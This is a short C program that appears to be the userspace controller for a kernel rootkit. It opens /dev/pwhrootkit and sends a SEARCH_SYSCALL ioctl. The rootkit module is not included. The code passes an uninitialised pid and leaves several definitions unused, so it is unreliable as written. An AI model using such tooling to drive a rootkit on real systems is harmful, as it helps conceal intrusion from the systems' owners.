#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>

#define USER_KALLSYMS 0x1111
#define SEARCH_SYSCALL 0x2222
struct user_args{
    void * content;
    int size;
};
int main(int argc, char ** argv){
    int fd;
    int opt;
    pid_t pid;

    fd = open("/dev/pwhrootkit", O_RDONLY);
    if(fd < 0){
        perror("open");
        return -1;
    }
    if(ioctl(fd, SEARCH_SYSCALL, pid)){
        perror("ioctl");
        return -1;
    }
    return 0;
}

